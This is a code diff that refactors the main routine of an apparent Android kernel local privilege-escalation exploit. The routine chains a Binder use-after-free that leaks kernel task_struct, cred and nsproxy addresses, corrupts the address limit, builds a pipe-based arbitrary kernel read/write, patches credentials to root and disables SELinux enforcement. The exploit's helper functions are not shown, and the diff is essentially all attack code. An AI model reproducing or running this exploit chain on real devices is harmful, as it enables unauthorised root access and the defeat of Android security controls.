@@ -15,32 +15,24 @@
 int main() {
   int pipefd[2] = {0};
   struct task_struct *leak_task_struct = NULL;
-  void *leak_pid_address = NULL;
-  void *leak_cred_address = NULL;
-  void *leak_nsproxy_address = NULL;
-  void *mapped_memory = NULL;
+  leaked_kernel_addrs addrs = {0};
 
   pin_cpu(0);
 
-  int binder_fd1 = open_binder(BINDER_DEVICE);
+  binder_ctx *ctx = open_binder(BINDER_DEVICE);
 
-  binder_uaf_leak_task_struct(binder_fd1, &leak_task_struct, &leak_pid_address,
-                              &leak_cred_address, &leak_nsproxy_address,
-                              &mapped_memory);
-  corrupt_address_limit(binder_fd1, &leak_task_struct, &mapped_memory);
+  binder_uaf_leak_task_struct(ctx, &leak_task_struct, &addrs);
+  corrupt_address_limit(ctx, &leak_task_struct);
 
   init_kernel_read_write_pipe(pipefd);
 
-  verify_arbitrary_read_write(pipefd, leak_task_struct, leak_pid_address);
+  verify_arbitrary_read_write(pipefd, leak_task_struct, addrs.pid);
 
-  patch_cred(pipefd, leak_task_struct, leak_cred_address);
-  disable_selinux_enforcing(pipefd, leak_nsproxy_address);
+  patch_cred(pipefd, leak_task_struct, addrs.cred);
+  disable_selinux_enforcing(pipefd, addrs.nsproxy);
   verify_root();
 
-  if (mapped_memory)
-    munmap(mapped_memory, 4096);
-
-  close(binder_fd1);
+  close_binder(ctx);
   close(pipefd[0]);
   close(pipefd[1]);
 
